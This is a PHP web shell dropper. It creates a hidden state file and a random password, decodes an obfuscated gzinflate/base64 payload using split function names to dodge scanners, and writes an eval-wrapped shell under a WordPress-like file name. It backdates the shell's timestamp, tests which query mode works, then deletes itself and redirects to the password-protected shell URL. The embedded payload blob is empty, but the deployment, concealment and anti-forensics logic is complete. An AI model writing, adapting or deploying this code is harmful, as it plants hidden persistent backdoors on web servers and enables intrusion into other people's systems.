@error_reporting(0);
@ini_set("display_errors",0);
@set_time_limit(0);

$pass_file = __DIR__ . "/.lil_tmp2";
if (file_exists($pass_file)) {
    $st = json_decode(file_get_contents($pass_file), true);
} else {
    $st = array(
        "pass" => substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 12),
        "name" => "wp-obj-" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 6) . ".php",
        "ax"   => substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 20),
        "emit" => "",
    );
    @file_put_contents($pass_file, json_encode($st));
}
$pass = $st["pass"]; $name = $st["name"]; $ax = $st["ax"]; $emit = $st["emit"];

$scheme = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off") ? "https" : "http";
$base_url = $scheme . "://" . $_SERVER["HTTP_HOST"] . dirname($_SERVER["PHP_SELF"]);
$shell_url = $base_url . "/" . $name;
$disp_url = $shell_url . "?password=" . $pass;

$BLOB = "";

function http_get($url) {
    if (function_exists("curl_init")) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>10,
            CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_USERAGENT=>"Mozilla/5.0"));
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return array($code, (string)$body);
    }
    $ctx = stream_context_create(array("http"=>array("timeout"=>10,"user_agent"=>"Mozilla/5.0"),
        "ssl"=>array("verify_peer"=>0,"verify_peer_name"=>0)));
    $body = @file_get_contents($url, false, $ctx);
    return array($body ? 200 : 0, (string)$body);
}

if (isset($_GET["action"]) && $_GET["action"] === "deploy") {
    $g = "gzin"."flate"; $b = "base"."64_decode";
    $tpl = $g($b($BLOB));
    if (!$tpl) die("Decode failed");
    $tpl = str_replace('L1LX2026x9k4m', $pass, $tpl);
    $old_ax = '$_GET[' . "'a'" . '] === ' . "'x'";
    $new_ax = '$_GET[' . "'a'" . '] === ' . "'" . $ax . "'";
    $tpl = str_replace($old_ax, $new_ax, $tpl);

    $dr = $_SERVER["DOCUMENT_ROOT"];
    $modes = array(
        array("ep" => "?d=",  "rx" => "d"),
        array("ep" => "?p=/", "rx" => "p"),
        array("ep" => "?p=",  "rx" => "p"),
    );
    $gz = "gzde"."flate"; $b6 = "base"."64_encode";
    foreach ($modes as $m) {
        $src2 = str_replace(array("{{EP}}", "{{RX}}"), array($m["ep"], $m["rx"]), $tpl);
        $wrapped = '<?php eval(' . "'" . '?>' . "'" . '.' . $g . '(' . $b . '(' . "'" . $b6($gz($src2, 9)) . "'" . '))); ?>';
        @file_put_contents(__DIR__ . "/" . $name, $wrapped);
        @chmod(__DIR__ . "/" . $name, 0644);
        @touch(__DIR__ . "/" . $name, 1745000000);
        if ($emit) break;
        list($code, $resp) = http_get($shell_url . $m["ep"] . urlencode($dr) . "&password=" . $pass);
        if ($code === 200 && strlen($resp) > 8000) { $emit = $m["ep"]; break; }
    }
    if (!$emit) $emit = "?d=";
    $st["emit"] = $emit;
    @file_put_contents($pass_file, json_encode($st));
    $final = $shell_url . $emit . urlencode($dr) . "&password=" . $pass;
    @unlink($pass_file);
    @unlink(__FILE__);
    header("Location: " . $final);
    exit;
}
